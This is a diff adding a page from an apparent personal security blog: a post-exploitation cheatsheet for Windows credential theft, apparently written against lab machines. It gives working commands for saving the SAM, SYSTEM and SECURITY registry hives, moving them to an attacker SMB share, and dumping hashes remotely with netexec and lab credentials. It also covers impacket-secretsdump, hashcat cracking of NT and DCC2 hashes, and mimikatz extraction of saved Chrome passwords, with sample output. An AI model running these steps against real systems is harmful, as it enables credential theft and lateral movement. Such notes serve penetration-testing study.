@@ -1,0 +1,392 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Windows Post-Exploitation: Dumping SAM Database Hashes | vipa0z</title>
+  <meta name="author" content="vipa0z">
+  
+  <meta name="description" content="With administrative access to a Windows system, one of the most effective post-exploitation techniques is to dump the Security Account Manager (SAM) database. The SAM stores hashed credentials for local user accounts and is a valuable target for attackers aiming to escalate privileges or move laterally within a network.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta name="google-site-verification" content="-1CTZCLTxditzGFr67zWpI5-6H8z7TlZt_LuEkJaIKE" />
+
+  <meta property="og:title" content="Windows Post-Exploitation: Dumping SAM Database Hashes"/>
+  <meta property="og:site_name" content="vipa0z"/>
+
+  
+    <meta property="og:image" content="favicon.png"/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="vipa0z" type="application/atom+xml">
+  
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+  <meta name="title" content="vipa0z">
+  <!-- analytics -->
+  <!-- 
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+ -->
+
+  <!--  favicon/indexing -->
+  <link rel="icon" type="image/png" href="/favicon.ico/favicon-96x96.png" sizes="96x96" />
+  <link rel="icon" type="image/svg+xml" href="/favicon.ico/favicon.svg" />
+  <link rel="shortcut icon" href="/favicon.ico/favicon.ico" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico/apple-touch-icon.png" />
+  <link rel="manifest" href="/favicon.ico/site.webmanifest" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">vipa0z</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/index" title="Home">
+			  <i class="fa fa-home"></i>Home
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a target="_blank" rel="noopener" href="https://magdy3660.gitbook.io/field-manualx/" title="Read My Manual">
+			  <i class="fa fa-file"></i>Read My Manual
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Windows Post-Exploitation: Dumping SAM Database Hashes</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <!-- <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> With administrative access to a Windows system, one of the most effective post-exploitation techniques is to dump the Security Account Manager (SAM) database. The SAM stores hashed credentials for local user accounts and is a valuable target for attackers aiming to escalate privileges or move laterally within a network.
+		 </div> alert -->
+	  		
+
+	  <p><img src="/../images/Secd1.png" alt="alt text"></p>
+<h1 id="Overview"><a href="#Overview" class="headerlink" title="_Overview"></a>_Overview</h1><p>With administrative access to a Windows system, one of the most effective post-exploitation techniques is to dump the Security Account Manager (SAM) database. The SAM stores hashed credentials for local user accounts and is a valuable target for attackers aiming to escalate privileges or move laterally within a network.</p>
+<p>By extracting SAM, SYSTEM, and SECURITY hives from the target machine, we can transfer them to our attack host and perform offline hash cracking using tools such as Hashcat or John the Ripper, or even perform Pass-the-Hash attacks.</p>
+<h2 id="Windows-Registery-Hives"><a href="#Windows-Registery-Hives" class="headerlink" title="Windows Registery Hives"></a>Windows Registery Hives</h2><p>There are three registry hives we can copy if we have<code> local administrative</code> access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes. A brief description of each is provided in the table below:</p>
+<table>
+<thead>
+<tr>
+<th>Registry Hive</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>HKLM\SAM</code></td>
+<td>Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.</td>
+</tr>
+<tr>
+<td><code>HKLM\SYSTEM</code></td>
+<td>Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.</td>
+</tr>
+<tr>
+<td><code>HKLM\SECURITY</code></td>
+<td>Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more.</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="hash-differences"><a href="#hash-differences" class="headerlink" title="hash differences"></a>hash differences</h1><table>
+<thead>
+<tr>
+<th>Feature</th>
+<th>SAM (SAM + SYSTEM)</th>
+<th>LSA Secrets (SECURITY)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Focus</td>
+<td>Local account password hashes</td>
+<td>Cached credentials &amp; secrets (domain creds, etc.)</td>
+</tr>
+<tr>
+<td>Format</td>
+<td>NTLM hashes</td>
+<td>Plaintext or encrypted strings</td>
+</tr>
+<tr>
+<td>Common Use</td>
+<td>Crack local user passwords</td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="cheatsheet"><a href="#cheatsheet" class="headerlink" title="cheatsheet"></a>cheatsheet</h1><p>  <code>reg.exe</code> to save copies of the registry hives:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; reg.exe save hklm\sam C:\sam.save</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; reg.exe save hklm\system C:\system.save</span><br><span class="line"></span><br><span class="line">&gt; reg.exe save hklm\security C:\security.save</span><br></pre></td></tr></table></figure>
+
+<p> copy to VM:</p>
+<ul>
+<li>create a smb share on attacking vm</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ impacket-smbserver -smb2support compdata /home/demise/mountshare</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>move hives to share:</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">move</span> <span class="title">sam.save</span> \\10.10.15.16\<span class="title">compdata</span></span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">move</span> <span class="title">security.save</span> \\10.10.15.16\<span class="title">compdata</span></span></span><br><span class="line"><span class="function">       </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">move</span> <span class="title">system.save</span> \\10.10.15.16\<span class="title">compdata</span></span></span><br><span class="line"><span class="function">     </span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line"></span><br><span class="line">sam.save  security.save  system.save</span><br></pre></td></tr></table></figure>
+
+<h3 id="dump-LSA-hashes-remotely"><a href="#dump-LSA-hashes-remotely" class="headerlink" title="dump LSA  hashes remotely"></a>dump LSA  hashes remotely</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</span><br></pre></td></tr></table></figure>
+<h3 id="dump-SAM-hashes-remotely"><a href="#dump-SAM-hashes-remotely" class="headerlink" title="dump SAM  hashes remotely"></a>dump SAM  hashes remotely</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</span><br></pre></td></tr></table></figure>
+<h3 id="Dump-Locally-with-impacket"><a href="#Dump-Locally-with-impacket" class="headerlink" title="Dump Locally  with impacket"></a>Dump Locally  with impacket</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
+
+<p>dumping format:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br></pre></td></tr></table></figure>
+<p>copy  <code>NT </code>hash to a file using nano </p>
+<h4 id="crack-NT-hash-with-hashcat"><a href="#crack-NT-hash-with-hashcat" class="headerlink" title="crack NT hash with hashcat"></a>crack NT hash with hashcat</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat -m 1000 c02478537b9727d391bc80011c2e2321 /usr/share/wordlists/rockyou.txt  -D 1 -O     </span><br></pre></td></tr></table></figure>
+
+
+<h3 id="cracking-DCC2-Hash-from-Security-hive"><a href="#cracking-DCC2-Hash-from-Security-hive" class="headerlink" title="cracking DCC2 Hash (from Security hive)"></a>cracking DCC2 Hash (from Security hive)</h3><p>hashed copies of network credential hashes. An example is:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25</span><br></pre></td></tr></table></figure>
+<p>The Hashcat mode for cracking DCC2 hashes is <code>2100</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat -m 2100 &#x27;$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25&#x27; /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="DPAPI-Decryption"><a href="#DPAPI-Decryption" class="headerlink" title="DPAPI Decryption"></a>DPAPI Decryption</h4><p>DPAPI encrypted credentials can be decrypted manually with tools like Impacket’s <a target="_blank" rel="noopener" href="https://github.com/fortra/impacket/blob/master/examples/dpapi.py">dpapi</a>, <a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>, or remotely with <a target="_blank" rel="noopener" href="https://github.com/login-securite/DonPAPI">DonPAPI</a>.&#96;</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public&gt; mimikatz.exe</span><br><span class="line">mimikatz <span class="comment"># dpapi::chrome /in:&quot;C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot; /unprotect</span></span><br><span class="line">&gt; Encrypted Key found <span class="keyword">in</span> local state file</span><br><span class="line">&gt; Encrypted Key seems to be protected by DPAPI</span><br><span class="line"> * <span class="keyword">using</span> CryptUnprotectData API</span><br><span class="line">&gt; AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c</span><br><span class="line"></span><br><span class="line">URL     : http://<span class="number">10.10</span>.<span class="number">14.94</span>/ ( http://<span class="number">10.10</span>.<span class="number">14.94</span>/login.html )</span><br><span class="line">Username: bob</span><br><span class="line"> * <span class="keyword">using</span> BCrypt with AES-256-GCM</span><br><span class="line">Password: April2025!</span><br></pre></td></tr></table></figure>
+
+<p>This tells us how to interpret the output and which hashes we can attempt to crack.</p>
+<h3 id="Methodology"><a href="#Methodology" class="headerlink" title="Methodology"></a>Methodology</h3><p><code>SAM</code> +<code> SYSTEM</code> -&gt; hash dump<br><code>SECURITY</code>  -&gt; cached domain hashes<br>                                               |<br>We can back up these hives using the <code>reg.exe</code> utility.</p>
+<h4 id="Using-reg-exe-to-copy-registry-hives"><a href="#Using-reg-exe-to-copy-registry-hives" class="headerlink" title="Using reg.exe to copy registry hives"></a>Using reg.exe to copy registry hives</h4><p>By launching <code>cmd.exe</code> with administrative privileges, we can use <code>reg.exe</code> to save copies of the registry hives. Run the following commands:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\sam C:\sam.save</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; reg.exe save hklm\system C:\system.save</span><br><span class="line"></span><br><span class="line">&gt; reg.exe save hklm\security C:\security.save</span><br></pre></td></tr></table></figure>
+
+<h1 id="copying-to-vm"><a href="#copying-to-vm" class="headerlink" title="copying to vm"></a>copying to vm</h1><p>To create the share, we simply run <code>smbserver.py -smb2support</code>, specify a name for the share (e.g., <code>CompData</code>), and point to the local directory on our attack host where the hive copies will be stored (e.g., <code>/home/ltnbob/Documents</code></p>
+<h3 id="DUMPING-HASHES"><a href="#DUMPING-HASHES" class="headerlink" title="DUMPING HASHES"></a>DUMPING HASHES</h3><p>the first step <code>secretsdump</code> performs is retrieving the <code>system bootkey</code> before proceeding to dump the <code>local SAM hashes</code>. This is necessary because the bootkey is used to encrypt and decrypt the SAM database. Without it, the hashes cannot be decrypted — which is why having copies of the relevant registry hives, as discussed earlier, is crucial.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br></pre></td></tr></table></figure>
+
+<h1 id="DCC2-HASH"><a href="#DCC2-HASH" class="headerlink" title="DCC2 HASH"></a>DCC2 HASH</h1><p>This type of hash is much more difficult to crack than an NT hash, as it uses PBKDF2. Additionally, it cannot be used for lateral movement with techniques like Pass-the-Hash (which we will cover later). The Hashcat mode for cracking DCC2 hashes is <code>2100</code>.<br>DCC2 hashes is approximately <code>800 times slower</code> to crack</p>
+<h1 id="DPAPI"><a href="#DPAPI" class="headerlink" title="DPAPI"></a>DPAPI</h1><p>DPAPI encrypted credentials can be decrypted manually with tools like Impacket’s <a target="_blank" rel="noopener" href="https://github.com/fortra/impacket/blob/master/examples/dpapi.py">dpapi</a>, <a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>, or remotely with <a target="_blank" rel="noopener" href="https://github.com/login-securite/DonPAPI">DonPAPI</a>.</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public&gt; mimikatz.exe</span><br><span class="line">mimikatz <span class="comment"># dpapi::chrome /in:&quot;C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot; /unprotect</span></span><br><span class="line">&gt; Encrypted Key found <span class="keyword">in</span> local state file</span><br><span class="line">&gt; Encrypted Key seems to be protected by DPAPI</span><br><span class="line"> * <span class="keyword">using</span> CryptUnprotectData API</span><br><span class="line">&gt; AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c</span><br><span class="line"></span><br><span class="line">URL     : http://<span class="number">10.10</span>.<span class="number">14.94</span>/ ( http://<span class="number">10.10</span>.<span class="number">14.94</span>/login.html )</span><br><span class="line">Username: bob</span><br><span class="line"> * <span class="keyword">using</span> BCrypt with AES-256-GCM</span><br><span class="line">Password: April2025!</span><br></pre></td></tr></table></figure>
+
+<h2 id="Remote-dumping-LSA-secrets-considerations"><a href="#Remote-dumping-LSA-secrets-considerations" class="headerlink" title="Remote dumping &amp; LSA secrets considerations"></a>Remote dumping &amp; LSA secrets considerations</h2><p>With access to credentials that have <code>local administrator privileges</code>, it is also possible to target LSA secrets over the network. This may allow us to extract credentials from running services, scheduled tasks, or applications that store passwords using LSA secrets.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">magdy3660@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</span><br><span class="line">[+] Dumping LSA secrets</span><br><span class="line">SMB         10.129.42.198   445    WS01     WS01\worker:Hello123</span><br><span class="line">SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
+
+	  <div class="article-footer-copyright">
+
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2025/05/22/Attacking lsass/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2025/03/26/dcsync/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2025-04-12 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/privEsc/">privEsc<span>1</span></a></li> <li><a href="/tags/windows/">windows<span>3</span></a></li> <li><a href="/tags/registry/">registry<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 vipa0z's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
